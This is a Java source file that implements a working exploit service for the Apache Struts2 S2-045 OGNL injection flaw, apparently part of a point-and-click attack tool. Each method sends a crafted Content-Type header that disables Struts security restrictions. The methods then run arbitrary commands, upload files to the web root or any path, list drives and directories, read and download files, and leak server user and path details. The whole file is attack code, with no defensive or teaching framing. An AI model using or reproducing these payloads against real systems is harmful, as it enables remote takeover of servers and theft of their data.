package org.vti.service.impl;

import java.io.InputStream;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import org.vti.core.HttpClient;
import org.vti.service.ExploitService;

import okhttp3.Request;
import okhttp3.ResponseBody;

public class S2045ExploitServiceImpl extends HttpClient implements ExploitService {

	@Override
	public String getRealPath(String url) throws Exception {
		ResponseBody responseBody = client.newCall(new Request.Builder().url(url)
				.header("Content-Disposition", "form-data; name=\"file\"; filename=\"data\"")
				.header("Content-Type",
						"%{(#f='multipart/form-data').(#ma=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
								+ ".(#_memberAccess?(#_memberAccess=#ma):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])"
								+ ".(#_memberAccess['allowStaticMethodAccess']=true)"
								+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
								+ ".(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())"
								+ ".(#context.setMemberAccess(#ma)))).(#req=@org.apache.struts2.ServletActionContext@getRequest())"
								+ ".(#path=#req.getSession().getServletContext().getRealPath('/'))"
								+ ".(#bis=new java.io.ByteArrayInputStream(#path.getBytes('UTF-8')))"
								+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
								+ ".(@org.apache.commons.io.IOUtils@copy(#bis,#ros)).(#ros.flush())}")
				.build()).execute().body();
		return responseBody.string();
	}

	@Override
	public Map<String, Object> getServerInfo(String url) throws Exception {
		ResponseBody responseBody = client.newCall(new Request.Builder().url(url)
				.header("Content-Disposition", "form-data; name=\"file\"; filename=\"data\"")
				.header("Content-Type",
						"%{(#f='multipart/form-data').(#ma=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
								+ ".(#_memberAccess?(#_memberAccess=#ma):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])"
								+ ".(#_memberAccess['allowStaticMethodAccess']=true)"
								+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
								+ ".(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())"
								+ ".(#context.setMemberAccess(#ma))))"
								+ ".(#sys=@java.lang.System@getProperty('os.name')+'#'+@java.lang.System@getProperty('user.name')"
								+ "+'#'+@java.lang.System@getProperty('user.home')+'#'+@java.lang.System@getProperty('java.home'))"
								+ ".(#bis=new java.io.ByteArrayInputStream((#sys+'').getBytes('UTF-8')))"
								+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
								+ ".(@org.apache.commons.io.IOUtils@copy(#bis,#ros)).(#ros.flush())}")
				.build()).execute().body();
		String info = responseBody.string();
		Map<String, Object> map = new LinkedHashMap<String, Object>();

		String array[] = info.split("#");
		if (array.length == 4) {
			map.put("os.name", array[0]);
			map.put("user.name", array[1]);
			map.put("user.home", array[2]);
			map.put("java.home", array[3]);
		} else {
			map.put("os.name", "");
			map.put("user.name", "");
			map.put("user.home", "");
			map.put("java.home", "");
		}
		return map;

	}

	@Override
	public String doExecuteCMD(String url, String cmd) throws Exception {
		ResponseBody responseBody = client.newCall(new Request.Builder().url(url)
				.header("Content-Disposition", "form-data; name=\"file\"; filename=\"data\"")
				.header("Content-Type",
						"%{(#f='multipart/form-data').(#ma=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
								+ ".(#_memberAccess?(#_memberAccess=#ma):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])"
								+ ".(#_memberAccess['allowStaticMethodAccess']=true)"
								+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
								+ ".(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())"
								+ ".(#context.setMemberAccess(#ma)))).(#cmd='" + cmd
								+ "').(#process=@java.lang.Runtime@getRuntime().exec(#cmd))"
								+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
								+ ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}")
				.build()).execute().body();
		return responseBody.string();
	}

	@Override
	public boolean doUpload(String url, String fileName, String content) throws Exception {
		content = URLEncoder.encode(content, "UTF-8");
		ResponseBody responseBody = client
				.newCall(new Request.Builder().url(url)
						.header("Content-Disposition", "form-data; name=\"file\"; filename=\"data\"")
						.header("Content-Type",
								"%{(#f='multipart/form-data').(#ma=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
										+ ".(#_memberAccess?(#_memberAccess=#ma):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])"
										+ ".(#_memberAccess['allowStaticMethodAccess']=true)"
										+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
										+ ".(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())"
										+ ".(#context.setMemberAccess(#ma)))).(#req=@org.apache.struts2.ServletActionContext@getRequest())"
										+ ".(#path=#req.getSession().getServletContext().getRealPath('/'))"
										+ ".(#file=new java.io.File(#path+'" + "/" + fileName + "'))"
										+ ".(#fos=new java.io.FileOutputStream(#file))"
										+ ".(#c=@java.net.URLDecoder@decode('" + content + "','UTF-8'))"
										+ ".(#fos.write(#c.getBytes()))" + ".(#fos.flush())" + ".(#fos.close())"
										+ ".(#bis=new java.io.ByteArrayInputStream('true'.getBytes('UTF-8')))"
										+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
										+ ".(@org.apache.commons.io.IOUtils@copy(#bis,#ros)).(#ros.flush())}")
						.build())
				.execute().body();
		return Boolean.valueOf(responseBody.string());
	}

	@Override
	public boolean doCustomUplaod(String url, String filePath, String content) throws Exception {
		content = URLEncoder.encode(content, "UTF-8");
		ResponseBody responseBody = client.newCall(new Request.Builder().url(url)
				.header("Content-Disposition", "form-data; name=\"file\"; filename=\"data\"")
				.header("Content-Type", "%{(#f='multipart/form-data').(#ma=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
						+ ".(#_memberAccess?(#_memberAccess=#ma):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])"
						+ ".(#_memberAccess['allowStaticMethodAccess']=true)"
						+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
						+ ".(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())"
						+ ".(#context.setMemberAccess(#ma)))).(#req=@org.apache.struts2.ServletActionContext@getRequest())"
						+ ".(#file=new java.io.File('" + filePath.trim() + "'))"
						+ ".(#fos=new java.io.FileOutputStream(#file))" + ".(#c=@java.net.URLDecoder@decode('" + content
						+ "','UTF-8'))" + ".(#fos.write(#c.getBytes()))" + ".(#fos.flush())" + ".(#fos.close())"
						+ ".(#bis=new java.io.ByteArrayInputStream('true'.getBytes('UTF-8')))"
						+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
						+ ".(@org.apache.commons.io.IOUtils@copy(#bis,#ros)).(#ros.flush())}")
				.build()).execute().body();
		String resp = responseBody.string();
		return Boolean.valueOf(resp);
	}

	@Override
	public List<String> doGetFileSystem(String url) throws Exception {
		int size = Integer.valueOf(client.newCall(new Request.Builder().url(url)
				.header("Content-Disposition", "form-data; name=\"file\"; filename=\"data\"")
				.header("Content-Type",
						"%{(#f='multipart/form-data').(#ma=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
								+ ".(#_memberAccess?(#_memberAccess=#ma):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])"
								+ ".(#_memberAccess['allowStaticMethodAccess']=true)"
								+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
								+ ".(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())"
								+ ".(#context.setMemberAccess(#ma))))"
								+ ".(#bis=new java.io.ByteArrayInputStream((@java.io.File@listRoots().length+'').getBytes('UTF-8')))"
								+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
								+ ".(@org.apache.commons.io.IOUtils@copy(#bis,#ros)).(#ros.flush())}")
				.build()).execute().body().string());

		List<String> list = new ArrayList<String>();

		for (int i = 0; i < size; i++) {

			String disk = client.newCall(new Request.Builder().url(url)
					.header("Content-Disposition", "form-data; name=\"file\"; filename=\"data\"")
					.header("Content-Type",
							"%{(#f='multipart/form-data').(#ma=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
									+ ".(#_memberAccess?(#_memberAccess=#ma):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])"
									+ ".(#_memberAccess['allowStaticMethodAccess']=true)"
									+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
									+ ".(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())"
									+ ".(#context.setMemberAccess(#ma))))"
									+ ".(#bis=new java.io.ByteArrayInputStream((@java.io.File@listRoots()[" + i
									+ "]+'').getBytes('UTF-8')))"
									+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
									+ ".(@org.apache.commons.io.IOUtils@copy(#bis,#ros)).(#ros.flush())}")
					.build()).execute().body().string();
			list.add(disk);
		}
		return list;
	}

	@Override
	public List<String> doListFiles(String url, String path) throws Exception {
		int size = Integer.valueOf(client.newCall(new Request.Builder().url(url)
				.header("Content-Disposition", "form-data; name=\"file\"; filename=\"data\"")
				.header("Content-Type",
						"%{(#f='multipart/form-data').(#ma=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
								+ ".(#_memberAccess?(#_memberAccess=#ma):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])"
								+ ".(#_memberAccess['allowStaticMethodAccess']=true)"
								+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
								+ ".(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())"
								+ ".(#context.setMemberAccess(#ma))))" + ".(#file=new java.io.File('" + path + "'))"
								+ ".(#bis=new java.io.ByteArrayInputStream((#file.listFiles().length+'').getBytes('UTF-8')))"
								+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
								+ ".(@org.apache.commons.io.IOUtils@copy(#bis,#ros)).(#ros.flush())}")

				.build()).execute().body().string());

		List<String> list = new ArrayList<String>();

		for (int i = 0; i < size; i++) {
			String disk = client.newCall(new Request.Builder().url(url)
					.header("Content-Disposition", "form-data; name=\"file\"; filename=\"data\"")
					.header("Content-Type",
							"%{(#f='multipart/form-data').(#ma=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
									+ ".(#_memberAccess?(#_memberAccess=#ma):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])"
									+ ".(#_memberAccess['allowStaticMethodAccess']=true)"
									+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
									+ ".(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())"
									+ ".(#context.setMemberAccess(#ma))))" + ".(#file=new java.io.File('" + path + "'))"
									+ ".(#bis=new java.io.ByteArrayInputStream((#file.listFiles()[" + i
									+ "].getName()).getBytes('UTF-8')))"
									+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
									+ ".(@org.apache.commons.io.IOUtils@copy(#bis,#ros)).(#ros.flush())}")
					.build()).execute().body().string();
			list.add(disk);
		}
		return list;
	}

	@Override
	public String doGetFileContent(String url, String path) throws Exception {
		ResponseBody responseBody = client.newCall(new Request.Builder().url(url)
				.header("Content-Disposition", "form-data; name=\"file\"; filename=\"data\"")
				.header("Content-Type",
						"%{(#f='multipart/form-data').(#ma=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
								+ ".(#_memberAccess?(#_memberAccess=#ma):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])"
								+ ".(#_memberAccess['allowStaticMethodAccess']=true)"
								+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
								+ ".(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())"
								+ ".(#context.setMemberAccess(#ma))))" + ".(#file=new java.io.File('" + path + "'))"
								+ ".(#fis=new java.io.FileInputStream(#file))"
								+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
								+ ".(@org.apache.commons.io.IOUtils@copy(#fis,#ros)).(#ros.flush())}")
				.build()).execute().body();
		return responseBody.string();
	}

	@Override
	public boolean doIsDirectory(String url, String path) throws Exception {
		ResponseBody responseBody = client.newCall(new Request.Builder().url(url)
				.header("Content-Disposition", "form-data; name=\"file\"; filename=\"data\"")
				.header("Content-Type",
						"%{(#f='multipart/form-data').(#ma=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
								+ ".(#_memberAccess?(#_memberAccess=#ma):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])"
								+ ".(#_memberAccess['allowStaticMethodAccess']=true)"
								+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
								+ ".(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())"
								+ ".(#context.setMemberAccess(#ma))))" + ".(#file=new java.io.File('" + path + "'))"
								+ ".(#bis=new java.io.ByteArrayInputStream((#file.isDirectory()+'').getBytes('UTF-8')))"
								+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
								+ ".(@org.apache.commons.io.IOUtils@copy(#bis,#ros)).(#ros.flush())}")
				.build()).execute().body();
		return Boolean.valueOf(responseBody.string());
	}

	@Override
	public InputStream doDownload(String url, String path) throws Exception {
		ResponseBody responseBody = client.newCall(new Request.Builder().url(url)
				.header("Content-Disposition", "form-data; name=\"file\"; filename=\"data\"")
				.header("Content-Type",
						"%{(#f='multipart/form-data').(#ma=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
								+ ".(#_memberAccess?(#_memberAccess=#ma):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])"
								+ ".(#_memberAccess['allowStaticMethodAccess']=true)"
								+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
								+ ".(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())"
								+ ".(#context.setMemberAccess(#ma))))" + ".(#file=new java.io.File('" + path + "'))"
								+ ".(#fis=new java.io.FileInputStream(#file))"
								+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
								+ ".(@org.apache.commons.io.IOUtils@copy(#fis,#ros)).(#ros.flush())}")
				.build()).execute().body();
		return responseBody.byteStream();
	}

}
